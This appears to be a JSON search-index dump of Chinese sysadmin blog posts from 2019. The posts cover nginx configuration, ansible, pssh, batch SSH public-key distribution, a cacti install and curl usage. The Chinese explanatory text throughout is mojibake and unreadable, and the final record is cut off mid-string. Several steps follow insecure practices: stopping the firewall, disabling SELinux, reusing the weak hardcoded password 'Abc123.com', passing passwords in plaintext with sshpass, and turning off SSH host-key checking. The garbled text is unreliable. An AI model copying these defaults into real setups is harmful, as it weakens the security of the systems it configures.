weightï¼šè®¾ç½®è½®è¯¢æƒé‡(åˆ†é…æ¯”ä¾‹) ip_hashï¼šåŒä¸€ä¸ªç”¨æˆ·è®¿é—®ï¼Œåˆ†é…åˆ°åŒä¸€å°æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessioné—®é¢˜ ","date":"2019-06-01 18:33","objectID":"/post/245/:0:0","tags":["nginx"],"title":"nginxå®ç°è´Ÿè½½å‡è¡¡","uri":"/post/245/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"æ ‡è®°å‚æ•°ï¼š last åœæ­¢å½“å‰è¿™ä¸ªè¯·æ±‚ï¼Œå¹¶æ ¹æ®é‡å†™åçš„è§„åˆ™ï¼Œé‡æ–°å‘èµ·ä¸€ä¸ªè¯·æ±‚ã€‚ break åœæ­¢å½“å‰è¿™ä¸ªè¯·æ±‚ï¼Œåœ¨å½“å‰å­—æ®µç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œä½†ä¸ä¼šåŒ¹é…å…¶ä»–locationã€‚ redirect ä¸´æ—¶é‡å®šå‘302 permanent æ°¸ä¹…é‡å®šå‘301 æ³¨* lastå’Œbreaké‡å†™åçš„åœ°å€ä¸ä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨åœ°å€æ ä¸­ redirectå’Œpermanenté‡å†™åçš„åœ°å€ä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„åœ°å€æ ä¸­ ä½¿ç”¨æ ¼å¼ï¼šrewrite åŒ¹é…è§„åˆ™ URIé‡å†™åçš„å†…å®¹ æ‰§è¡ŒåŠ¨ä½œ(æ ‡è®°); ä½¿ç”¨å­—æ®µï¼šserver, location, if ä¸¾ä¾‹: è®¿é—®soulchild.comæ—¶ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°www.soulchild.com server { listenÂ 80; server_nameÂ soulchild.com; rewrite (^.*$) http://www.soulchild.com$1 permanent; } server { listenÂ 80; server_nameÂ www.soulchild.com; location / { rootÂ /app/www; indexÂ index.html index.htm; access_log /app/logs/access_www.log main; å½“åŒ¹é…åˆ°ä»¥htmlç»“å°¾çš„URIæ—¶ï¼Œè¿›è¡Œrewriteï¼Œ$1ä¸ºåŒ¹é…åˆ°(.*)çš„å†…å®¹ã€‚ è®¿é—®soulchild.cn/index.htmlæ—¶ï¼Œå°†URIé‡å†™ä¸º/?p=indexï¼Œåœ¨è¿›è¡ŒåŒ¹é…å…¶ä»–location(lastçš„ä½œç”¨) location ~ html$ { rewrite /(.*).html$ /?p=$1 last; } ","date":"2019-06-01 18:32","objectID":"/post/243/:0:0","tags":["nginx"],"title":"nginxä¸­rewriteçš„ä½¿ç”¨","uri":"/post/243/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®‰è£…htpasswdå·¥å…· yum installÂ httpd-tools -y ç”Ÿæˆå¯†ç æ–‡ä»¶ htpasswd -bc /application/nginx/conf/htpasswd ç”¨æˆ·å å¯†ç  chown www.www /application/nginx/conf/htpasswd chmod 400 /application/nginx/conf/htpasswd #å‚æ•°ï¼š -b:éäº¤äº’ -c:åˆ›å»ºæ–°æ–‡ä»¶ æ‰“å¼€nginxæˆ–è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ï¼Œåœ¨éœ€è¦è®¤è¯çš„é¡µé¢ä¸­æ·»åŠ æ ‡çº¢å†…å®¹ï¼š ################################################# location /status/ { stub_status; auth_basic â€œdescribeâ€; auth_basic_user_file /application/nginx/conf/conf.d/htpasswd; } ################################################# è¯´æ˜ï¼š auth_basic:ç½‘ç«™æè¿° auth_basic_user_file:æŒ‡å®šå¯†ç æ–‡ä»¶è·¯å¾„ é‡å¯æœåŠ¡ nginx -s reload ","date":"2019-06-01 18:31","objectID":"/post/241/:0:0","tags":["nginx"],"title":"nginx  auth_basicç®€æ˜“ç™»å½•è®¤è¯","uri":"/post/241/"},{"categories":["åŸºç¡€å†…å®¹","ansible"],"content":"ä½¿ç”¨ansibleéœ€è¦å…ˆé…ç½®å¯†é’¥è®¤è¯ï¼Œå¯å‚è€ƒhttps://www.soulchild.cn/204.html ansibleåœ¨epelæºä¸­ï¼Œéœ€è¦å…ˆé…ç½®å¥½æºåœ¨è¿›è¡Œå®‰è£…ã€‚ yum install -y epel-release yum install -y ansible å®‰è£…å®Œåä¿®æ”¹/etc/ansible/ansible.cfgé…ç½®æ–‡ä»¶ä¸­çš„ä»¥ä¸‹å‚æ•° host_key_checking= False ä¸»æœºåˆ—è¡¨æ–‡ä»¶ /etc/ansible/hosts [root@m01 ~]# egrep -v â€œ^$|#â€ /etc/ansible/hosts [soulchild] 172.16.1.7 172.16.1.31 172.16.1.41 ansibleä½¿ç”¨å‚æ•°ï¼š -m:æŒ‡å®šæ¨¡å—å ä¸¾ä¾‹ï¼š [root@m01 ~]# ansible soulchild -m pingÂ #soulchildéœ€è¦æ”¹ä¸ºå¯¹åº”çš„ä¸»æœºæ¨¡å—åï¼Œæˆ–è€…å†™all:ä»£è¡¨æ‰€æœ‰ä¸»æœº ","date":"2019-06-01 18:29","objectID":"/post/237/:0:0","tags":["ansible"],"title":"ansibleå®‰è£…é…ç½®å¹¶ç®€å•ä½¿ç”¨","uri":"/post/237/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"#éäº¤äº’ç”Ÿæˆå¯†é’¥å¯¹,ç”Ÿæˆå‰ç¡®è®¤.sshç›®å½•ä¸‹æ²¡æœ‰åŒåæ–‡ä»¶ï¼Œå¦åˆ™ä¼šæç¤ºæ˜¯å¦è¦†ç›– [root@m01 ~]# ssh-keygen -t rsa -f /root/.ssh/id_rsa -P \"\" å‚æ•°ï¼š -t:æŒ‡å®šç®—æ³• -f:æŒ‡å®šæ–‡ä»¶è·¯å¾„ä»¥åŠæ–‡ä»¶å -P:è®¾ç½®å¯†ç ã€‚â€œâ€œä¸ºç©ºå¯†ç  sshpass -pmima ssh-copy-id -i /root/.ssh/id_rsa.pub -oStrictHostkeyChecking=no root@$n å‚æ•°ï¼š sshpass -p:æŒ‡å®šå¯†ç  ssh-copy-id -i:æŒ‡å®šå…¬é’¥æ–‡ä»¶è·¯å¾„ -oStrictHostkeyChecking=no:ä¸´æ—¶å…³é—­çœŸå®æ€§æç¤º #ä½¿ç”¨è„šæœ¬éœ€è¦å…ˆåœ¨/tmp/ip_listæ–‡ä»¶ä¸­å†™å¥½IPï¼Œ [root@m01 scripts]# cat ssh-copy-id.sh #!/bin/bash if [ -f \"/root/.ssh/id_rsa\" ];then echo \"å¯†é’¥å·²å­˜åœ¨\" exit #rm -f /root/.ssh/id_rsa* fi ssh-keygen -t dsa -f /root/.ssh/id_rsa -P \"\" \u003e/dev/null 2\u003e\u00261 for ip in `cat /tmp/ip_list` do sshpass -pmima ssh-copy-id -i /root/.ssh/id_rsa.pub -oStrictHostkeyChecking=no root@$ip \u003e /dev/null 2\u003e\u00261 [ $? -eq 0 ] \u0026\u0026 echo \"$ipå·²åˆ†å‘å®Œæˆ\" || echo \"$ipåˆ†å‘å¤±è´¥\" done [root@m01 scripts]# pssh -ih /tmp/ip_list hostname [1] 23:07:41 [SUCCESS] 172.16.1.7 web01 [2] 23:07:41 [SUCCESS] 172.16.1.41 backup [3] 23:07:41 [SUCCESS] 172.16.1.31 nfs01 ","date":"2019-06-01 18:23","objectID":"/post/233/:0:0","tags":["å¯†é’¥","ssh"],"title":"sshæ‰¹é‡åˆ†å‘å…¬é’¥ç®€æ˜“è„šæœ¬","uri":"/post/233/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"å®‰è£…pssh(åœ¨epelæºä¸­) [root@m01 ~]# yum install -y pssh å‚æ•°è¯´æ˜ï¼š -hï¼šæŒ‡å®šä¸»æœºåˆ—è¡¨æ–‡ä»¶,(æ–‡ä»¶å†…å®¹æ ¼å¼:â€œuser@host:portâ€,ä¸€è¡Œä¸€ä¸ª)ï¼Œä¾‹:root@172.16.1.10:5832 -Hï¼šç›´æ¥æŒ‡å®šä¸»æœºIPï¼Œæ ¼å¼åŒä¸Š -pï¼šæŒ‡å®šçº¿ç¨‹æ•°ï¼Œå¹¶å‘æ‰§è¡Œ(å¯é€‰) -tï¼šè®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œ0ä¸ºæ— é™(å¯é€‰) -Aï¼šä½¿ç”¨äº¤äº’çš„å½¢å¼è¾“å…¥å¯†ç (å¯é€‰) -iï¼šå°†æ¯å°æœåŠ¡å™¨çš„æ­£ç¡®ä¿¡æ¯å’Œé”™è¯¯ä¿¡æ¯éƒ½æ‰“å°å‡ºæ¥ -Pï¼šæ‰“å°å‡ºæœåŠ¡å™¨è¿”å›ä¿¡æ¯(ä¸æ¸…æ¥šå’Œ-içš„åŒºåˆ«) ä½¿ç”¨ï¼š #å•å°æœåŠ¡å™¨æ‰§è¡Œè¿œç¨‹å‘½ä»¤ [root@m01 ~]# pssh -iH 172.16.1.31 hostname æ‰¹é‡æ‰§è¡Œå‘½ä»¤(æŒ‰ç…§æ–‡ä»¶åˆ—è¡¨) [root@m01 ~]# cat host.txt 172.16.1.31 172.16.1.41 172.16.1.7 [root@m01 ~]# pssh -ih host.txt hostname [1] 23:54:56 [SUCCESS] 172.16.1.31 nfs01 [2] 23:54:56 [SUCCESS] 172.16.1.41 backup [3] 23:54:56 [SUCCESS] 172.16.1.7 web01 ä½¿ç”¨sshpassæŒ‡å®šå¯†ç  [root@m01 ~]# sshpass -pxxxxxxx pssh -ih host.txt hostname ","date":"2019-06-01 18:21","objectID":"/post/230/:0:0","tags":["ssh","pssh"],"title":"psshç®€å•ä½¿ç”¨","uri":"/post/230/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®˜æ–¹æ–‡æ¡£ï¼šhttp://nginx.org/en/docs/http/ngx_http_log_module.html å®šä¹‰æ ¼å¼ï¼š #log_formatÂ mainÂ â€˜$remote_addr - $remote_user [$time_local] â€œ$requestâ€ ' #Â â€˜$status $body_bytes_sent â€œ$http_refererâ€ ' #Â â€˜\"$http_user_agent\" â€œ$http_x_forwarded_forâ€â€™; #access_logÂ logs/access.logÂ main; ###################################################### log_formatÂ mainï¼š mainçš„åå­—å¯ä»¥è‡ªå®šä¹‰ï¼Œå¯ä»¥åœ¨httpå­—æ®µä¸­ä½¿ç”¨ $remote_addrï¼šå®¢æˆ·ç«¯ipåœ°å€ $remote_userï¼šè¿œç¨‹ç”¨æˆ·ï¼Œé»˜è®¤ä¸ºç©º $time_localï¼šå½“å‰æ—¶é—´ $requestï¼šè¯·æ±‚èµ·å§‹è¡Œ $statusï¼šçŠ¶æ€ç  $body_bytes_sentï¼šè¿”å›ç»™å®¢æˆ·ç«¯çš„å†…å®¹å¤§å°(å­—èŠ‚) $http_refererï¼šè¯·æ±‚æ¥æºåœ°å€(å³ä»å“ªä¸ªé¡µé¢è·³è½¬è¿‡æ¥çš„) $http_user_agentï¼šç”¨æˆ·ä½¿ç”¨çš„å®¢æˆ·ç«¯ $http_x_forwarded_forï¼šè®°å½•ç”¨æˆ·çœŸå®ipï¼Œä½¿ç”¨è´Ÿè½½å‡è¡¡æ—¶ä¼šç”¨åˆ° access_logÂ logs/access.logÂ main gzip buffer=32k flush=5s; main:ä½¿ç”¨æŒ‡å®šçš„æ—¥å¿—æ ¼å¼ logs/access.logï¼šæ—¥å¿—ä¿å­˜çš„è·¯å¾„ gzip:ä¿å­˜ä¸ºå‹ç¼©åŒ…(å¯ä½¿ç”¨zcat,zless,zgrepæŸ¥çœ‹) buffer:å…ˆå­˜åœ¨å†…å­˜ä¸­ï¼Œè¾¾åˆ°32kæ—¶å†å†™åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ flush:æ¯5ç§’æ›´æ–°ä¸€æ¬¡æ—¥å¿—ï¼ˆå†™å…¥ï¼‰ å¯ä»¥åœ¨http, server, location, if in location, limit_exceptå­—æ®µä¸­ä½¿ç”¨ ","date":"2019-06-01 18:19","objectID":"/post/227/:0:0","tags":["nginx"],"title":"nginxæ—¥å¿—æ ¼å¼è¯´æ˜","uri":"/post/227/"},{"categories":["ç›‘æ§"],"content":"##cacti0.8.8hå®‰è£…ç¬”è®° è®¾ç½®æ—¶åŒº cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime ntpdate time.windows.com å…³é—­é˜²ç«å¢™ã€selinux service iptables stop chkconfig iptables off setenforce 0 1.å®‰è£…LAMPç¯å¢ƒå’Œsnmpã€rrdtool yum install -y httpd httpd-devel mysql-develÂ mysql-server mysql php php-mysql gd php-gd gd-devel php-xml php-common php-mbstring php-ldap php-pear php-xmlrpc php-imap net-snmp net-snmp-utils net-snmp-devel rrdtool php-snmp gcc 2.è®¾ç½®æœåŠ¡å¼€æœºè‡ªå¯ chkconfig â€“level 35 httpd on chkconfig â€“level 35 mysqld on chkconfig â€“level 35 snmpd on 3.å¼€å¯æœåŠ¡ service httpd start service mysqld start service snmpd start 4.è®¾ç½®mysqlå¯†ç  mysqladmin -u root password Abc123.com 5.å®‰è£…cacti wget http://www.cacti.net/downloads/cacti-0.8.8h.tar.gz tar zxvf ./cacti-0.8.8h.tar.gz cp -r cacti-0.8.8h/* /var/www/html/ 6.ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /var/www/html/include/config.php #ä¿®æ”¹ä¸ºå¦‚ä¸‹å‚æ•°ï¼š $database_type = â€œmysqlâ€; $database_default = â€œcactiâ€; $database_hostname = â€œlocalhostâ€; $database_username = â€œcactiâ€; $database_password = â€œAbc123.comâ€; 7.é…ç½®mysql mysql -uroot -p #ç™»é™†mysql create database cacti;Â #åˆ›å»ºåº“ GRANT ALL ON cacti.* TO cacti@localhost IDENTIFIED BY â€˜Abc123.comâ€™; #æˆæƒcactiç”¨æˆ·æœ¬åœ°è®¿é—®ï¼Œå¹¶è®¾ç½®å¯†ç ä¸ºAbc123.com flush privileges; #åˆ·æ–°æƒé™ quit; mysql -u cacti -p cacti \u003c /var/www/html/cacti.sql #å¯¼å…¥cactiæ•°æ®åº“ 8.ä¿®æ”¹phpæ—¶åŒº vim /etc/php.ini #ä¿®æ”¹å¦‚ä¸‹å†…å®¹ date.timezone = PRC #é‡å¯æœåŠ¡ service httpd restart 9.å®‰è£…spine wget https://www.cacti.net/downloads/spine/cacti-spine-0.8.8h.tar.gz tar zxvf cacti-spine-0.8.8h.tar.gz cd cacti-spine-0.8.8h ./configure make \u0026\u0026 make install cp /usr/local/spine/etc/spine.conf.dist /etc/spine.conf vim /etc/spine.conf #ä¿®æ”¹ä¸ºå¦‚ä¸‹é…ç½®ï¼š DB_HostÂ localhost DB_DatabaseÂ cacti DB_UserÂ cacti DB_PassÂ Abc123.com DB_PortÂ 3306 10.æ·»åŠ è®¡åˆ’ä»»åŠ¡ crontab -e */1 * * * *Â /usr/bin/php /var/www/html/poller.php \u003e /dev/null 2\u003e\u00261 11.å›¾è¡¨ä¸­æ–‡æ˜¾ç¤º vim /var/www/html/lib/functions.php åœ¨ç¬¬äºŒè¡Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š setlocale(LC_CTYPE,â€œzh_CN.UTF-8â€); å®‰è£…ä¸­æ–‡å­—ä½“ yum install -y wqy-zenhei-fonts 12.ä¿®æ”¹cactié»˜è®¤URI vim /var/www/html/include/global.php å°†ç¬¬46è¡Œæ”¹ä¸ºå¦‚ä¸‹å†…å®¹ï¼š $url_path = â€œ/â€; 13.ç™»é™†webé¡µé¢ åœ°å€ï¼šhttp://IP/cacti é»˜è®¤è´¦å·å¯†ç ï¼šadmin ç¬¬ä¸€æ¬¡ç™»é™†è¦æ±‚æ›´æ”¹å¯†ç  14.è®¾ç½®cactiå‚æ•° Console -\u003e Cacti Settings -\u003e General å°†SNMP Timeoutä¿®æ”¹ä¸º1000 Console -\u003e Cacti Settings -\u003e pathsÂ å°†Spine Poller File Pathä¿®æ”¹ä¸º/usr/local/spine/bin/spine Console -\u003e Cacti Settings -\u003e PollerÂ å°†Poller Typeæ”¹ä¸ºspineï¼ŒPoller Intervalå’Œcron Intervalæ”¹ä¸ºEvery Minute Console -\u003e Cacti Settings -\u003e PollerÂ å°†Maximum SNMP OIDâ€™s ä¿®æ”¹ä¸º1 Console -\u003e Utilities ç‚¹å‡»Rebuild Poller Cacheï¼Œé‡å»ºç¼“å­˜ ","date":"2019-06-01 18:15","objectID":"/post/225/:0:0","tags":["cacti"],"title":"centos6.5å®‰è£…cacti0.8.8h","uri":"/post/225/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"#çŠ¶æ€ç æ¨¡å— ç¼–è¯‘å®‰è£…æ—¶éœ€è¦æŒ‡å®šâ€“with-http_stub_status_module åœ¨serverå­—æ®µä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š location /status/ { stub_status; #1.75ä¹‹å‰çš„ç‰ˆæœ¬ä½¿ç”¨stub_status on } æµè§ˆå™¨ä¸­è¾“å…¥IP/status/ å³10.0.0.7/status/ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹å†…å®¹ ############################################# Active connections: 1 server accepts handled requests 3Â 3 7 Reading: 0 Writing: 1 Waiting: 0 ############################################# å«ä¹‰è¯´æ˜ï¼š Active connections: åŒ…æ‹¬ç­‰å¾…è¿æ¥åœ¨å†…çš„å½“å‰æ´»åŠ¨å®¢æˆ·ç«¯è¿æ¥æ•°ã€‚(ä¸æœåŠ¡å™¨å·²ç»å»ºç«‹çš„è¿æ¥çš„è¿æ¥æ•°é‡, å½“å‰å¹¶å‘æ•°é‡) acceptsï¼šå·²æ¥å—çš„å®¢æˆ·ç«¯è¿æ¥æ€»æ•° handledï¼šå·²å¤„ç†çš„è¿æ¥æ€»æ•°(æ­£å¸¸æƒ…å†µä¸‹ä¸å·²æ¥å—çš„æ•°é‡ä¸€è‡´) requestsï¼šå®¢æˆ·ç«¯ä¸€å…±å‘èµ·çš„è¯·æ±‚æ€»æ•° Reading:nginxæ­£åœ¨è¯»å–å¤šå°‘ä¸ªç”¨æˆ·çš„è¯·æ±‚å¤´ Writing:nginxæ­£åœ¨å“åº”å¤šå°‘ç”¨æˆ·çš„è¯·æ±‚å¤´ Waiting: å½“å‰ç©ºé—²å®¢æˆ·ç«¯ ç­‰å¾…è¿æ¥çš„æ€»æ•° å®˜æ–¹ç»™å‡ºçš„è§£é‡Šï¼š Active connections The current number of active client connections including Waiting connections. accepts The total number of accepted client connections. handled The total number of handled connections. Generally, the parameter value is the same as accepts unless some resource limits have been reached (for example, the worker_connections limit). requests The total number of client requests. Reading The current number of connections where nginx is reading the request header. Writing The current number of connections where nginx is writing the response back to the client. Waiting The current number of idle client connections waiting for a request. ","date":"2019-06-01 18:14","objectID":"/post/223/:0:0","tags":["nginx"],"title":"nginxçŠ¶æ€ç æ¨¡å—é…ç½®ä¿¡æ¯è¯´æ˜","uri":"/post/223/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®˜æ–¹æ–‡æ¡£ï¼šhttp://nginx.org/en/docs/http/ngx_http_core_module.html#location locationä¸»è¦ç”¨æ¥åŒ¹é…URI Syntax: location [ = | ~ | ~* | ^~ ] uri { â€¦ } location @name { â€¦ } Default: â€” Context: server, location =ï¼šç²¾ç¡®åŒ¹é…ã€‚ä¼˜å…ˆçº§æœ€é«˜ ^~:ä¸åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ã€‚ä¼˜å…ˆçº§ç¬¬äºŒ ~:åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸åˆ†åŒºå¤§å°å†™ã€‚è¿˜å¯ä»¥ä½¿ç”¨é€»è¾‘æ“ä½œç¬¦å–åï¼š!,!~,!~ã€‚ä¼˜å…ˆçº§ç¬¬ä¸‰ ~ï¼šåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒºåˆ†å¤§å°å†™ã€‚ä¼˜å…ˆçº§ç¬¬å›› location = / {Â è®¿é—®çš„åœ°å€uriéƒ¨åˆ†æ²¡æœ‰å†…å®¹å’Œåªæœ‰/çš„æ—¶å€™åŒ¹é… [ configuration A ] } location / {Â é»˜è®¤è§„åˆ™Â å…¶ä»–æ¡ä»¶éƒ½ä¸åŒ¹é…çš„æ—¶å€™ä½¿ç”¨æ­¤è§„åˆ™ [ configuration B ] } location /documents/ {Â åŒ¹é…è·¯å¾„(uriä¸­åŒ…å«æŒ‡å®šçš„ç›®å½•æ—¶åŒ¹é…)Â www.soulchild.cn/documents/è®¿é—®æ­¤åœ°å€æ—¶ä¼šåŒ¹é…æˆåŠŸ [ configuration C ] } location ^~ /images/ {Â ä¼˜å…ˆåŒ¹é…è·¯å¾„(uriä¸­åŒ…å«æŒ‡å®šçš„ç›®å½•æ—¶åŒ¹é…) www.soulchild.cn/images/adminå¯ä»¥åŒ¹é…æˆåŠŸ [ configuration D ] } location ~* .(gif|jpg|jpeg)$ {Â æ­£åˆ™åŒ¹é… ä¸åŒºåˆ†å¤§å°å†™ï¼Œè®¿é—®çš„uriä¸­ä»¥æŒ‡å®šå†…å®¹ç»“å°¾æ—¶åŒ¹é…æˆåŠŸ [ configuration E ] } ä¸¾ä¾‹ï¼šåªæœ‰æŒ‡å®šipå¯ä»¥è®¿é—®adminç›®å½•ï¼Œå…¶ä»–äººç¦æ­¢è®¿é—® location /admin/ { root /app/www/; index index.html; allow 10.0.0.0/24; deny all; } ","date":"2019-06-01 18:12","objectID":"/post/220/:0:0","tags":["nginx"],"title":"nginxé…ç½®æ–‡ä»¶çš„locationè§„åˆ™é…ç½®","uri":"/post/220/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"Â curlå‚æ•°è¯´æ˜ï¼š -vÂ æ˜¾ç¤ºè¯·æ±‚è¯¦ç»†ä¿¡æ¯ -HÂ ä¿®æ”¹è¯·æ±‚å¤´éƒ¨å†…å®¹Â ä¸¾ä¾‹ï¼šcurl -v -H Host:www.baidu.com www.soulchild.com -IÂ åªæ˜¾ç¤ºè¯·æ±‚å¤´éƒ¨ -oÂ å°†ç½‘é¡µè®¿é—®ç»“æœå†…å®¹ä¿å­˜åˆ°æŒ‡å®šä½ç½® -OÂ å°†ç½‘é¡µè®¿é—®ç»“æœå†…å®¹æŒ‰ç…§æœåŠ¡å™¨çš„æ–‡ä»¶åä¿å­˜åˆ°æœ¬åœ° -sÂ é™é»˜æ¨¡å¼ã€‚ä¸æ˜¾ç¤ºè¿›åº¦è¡¨æˆ–é”™è¯¯æ¶ˆæ¯ã€‚ -wÂ æŒ‰ç…§æŒ‡å®šæ ¼å¼è¾“å‡º -LÂ è·Ÿéšé‡å®šå‘è·³è½¬ -XÂ æŒ‡å®šè®¿é—®æ–¹å¼GETã€POST -dÂ æŒ‡å®šPOSTæäº¤æ•°æ® â€“data-ascii \u003cdata\u003e ä»¥asciiçš„æ–¹å¼postæ•°æ® â€“data-binary \u003cdata\u003e ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼postæ•°æ® -cÂ æ“ä½œç»“æŸåæŠŠcookieå†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶ä¸­ -bÂ cookieå­—ç¬¦ä¸²æˆ–æ–‡ä»¶è¯»å–ä½ç½® å–httpçŠ¶æ€ç æ–¹æ³•1ï¼š curl -s -w â€œ%{http_code}\\nâ€Â -o /dev/nullÂ www.soulchild.com å–httpçŠ¶æ€ç æ–¹æ³•2ï¼š curl -s -I www.soulchild.com | awk â€˜NR==1{print $2}â€™ æŸ¥çœ‹å“åº”æ—¶é—´: curl -s -w â€™ dns:%{time_namelookup}, conn:%{time_connect}, c-s_resp:%{time_starttransfer}, total:%{time_total}, down:%{speed_download}byte/s â€™ 1.1.1.1:8080/actuator/health/liveness ","date":"2019-06-01 18:06","objectID":"/post/214/:0:0","tags":[],"title":"curlå‘½ä»¤ç®€å•ä½¿ç”¨","uri":"/post/214/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"[root@web01 nginx]# egrep -v â€˜^$|#â€™ conf/nginx.conf.default worker_processesÂ 1;Â # å·¥ä½œè¿›ç¨‹æ•°é‡(å»ºè®®è®¾ç½®ä¸cpuæ ¸å¿ƒæ•°ä¸€è‡´) events { worker_connectionsÂ 1024;Â # æ¯ä¸ªå·¥ä½œè¿›ç¨‹æ”¯æŒæœ€å¤§è¿æ¥æ•° } http { includeÂ mime.types;Â # nginxæ”¯æŒçš„åª’ä½“ç±»å‹ default_typeÂ application/octet-stream;Â # é»˜è®¤çš„åª’ä½“ç±»å‹ sendfileÂ on;Â # å¼€å¯é«˜æ•ˆä¼ è¾“æ¨¡å¼ keepalive_timeoutÂ 65; # å­˜æ´»è¶…æ—¶æ—¶é—´(ä¸€æ¬¡è¿æ¥ä¿ç•™65ç§’) server { listenÂ 80;Â # ç›‘å¬ç«¯å£ server_nameÂ localhost;Â # ç»‘å®šçš„åŸŸå location / {Â # é»˜è®¤locationè§„åˆ™ rootÂ html;Â # é»˜è®¤ç«™ç‚¹ç›®å½• indexÂ index.html index.htm;Â # é»˜è®¤ä¸»é¡µæ–‡ä»¶ } error_pageÂ 500 502 503 504Â /50x.html;Â # é‡åˆ°è¿™äº›çŠ¶æ€ç éƒ½ä¼šè·³è½¬50x.html location = /50x.html {Â # URIçš„å†…å®¹æ˜¯/50x.html rootÂ html; # åœ¨æ­¤ç›®å½•æ‰¾50x.html } } } ","date":"2019-06-01 18:05","objectID":"/post/212/:0:0","tags":[],"title":"nginxé…ç½®æ–‡ä»¶è¯´æ˜","uri":"/post/212/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸‹è½½åœ°å€ï¼šhttp://nginx.org/download/nginx-1.14.2.tar.gz ","date":"2019-06-01 18:04","objectID":"/post/210/:1:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å®‰è£…å¼€å‘ä¾èµ–ç¯å¢ƒï¼š yum install -y pcre-devel openssl-devel ","date":"2019-06-01 18:04","objectID":"/post/210/:2:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åˆ›å»ºnginxè¿è¡Œç”¨æˆ·ï¼š useradd -g nginx -s /sbin/nologin -M www ","date":"2019-06-01 18:04","objectID":"/post/210/:3:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ç¼–è¯‘å®‰è£…nginxï¼š mkdir -p /server/tools cd /server/tools wget -P ./ http://nginx.org/download/nginx-1.14.2.tar.gz tar zxvf nginx-1.14.2.tar.gz cd nginx-1.14.2/ ./configureÂ --prefix=/application/nginx-1.14.2Â --user=wwwÂ --group=wwwÂ --with-http_stub_status_moduleÂ --with-http_ssl_module ","date":"2019-06-01 18:04","objectID":"/post/210/:4:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å‚æ•°è¯´æ˜ï¼š â€“prefix=/application/nginx-1.14.2Â #æŒ‡å®šå®‰è£…ä½ç½® â€“user=www #æŒ‡å®šè¿è¡Œç”¨æˆ· â€“group=wwwÂ #æŒ‡å®šè¿è¡Œç”¨æˆ·ç»„ â€“with-http_stub_status_moduleÂ #å®‰è£…çŠ¶æ€æ¨¡å— â€“with-http_ssl_module #å®‰è£…sslæ¨¡å—ï¼Œå®ç°https ","date":"2019-06-01 18:04","objectID":"/post/210/:4:1","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ç¼–è¯‘\u0026å®‰è£… make \u0026\u0026 make install ","date":"2019-06-01 18:04","objectID":"/post/210/:5:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"åˆ›å»ºè½¯è¿æ¥ï¼Œæ–¹ä¾¿ä»¥åä½¿ç”¨ ln -s /application/nginx-1.14.2 /application/nginx ln -s /application/nginx/sbin/nginx /sbin/nginx ","date":"2019-06-01 18:04","objectID":"/post/210/:6:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¯åŠ¨æœåŠ¡ nginx ","date":"2019-06-01 18:04","objectID":"/post/210/:7:0","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å¸¸ç”¨å‘½ä»¤è¯´æ˜ï¼š nginx -s stopÂ #åœæ­¢æœåŠ¡ nginx -s reload #å¹³æ»‘é‡å¯æœåŠ¡ nginx -tÂ #æ£€æŸ¥é…ç½®æ–‡ä»¶ ","date":"2019-06-01 18:04","objectID":"/post/210/:7:1","tags":["nginx"],"title":"centos7-nginx1.14.2ç¼–è¯‘å®‰è£…","uri":"/post/210/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ç®€åŒ–é…ç½®æ–‡ä»¶ cd /application/nginx/conf/ egrep -v '^$|#' nginx.conf.default \u003e nginx.conf ","date":"2019-06-01 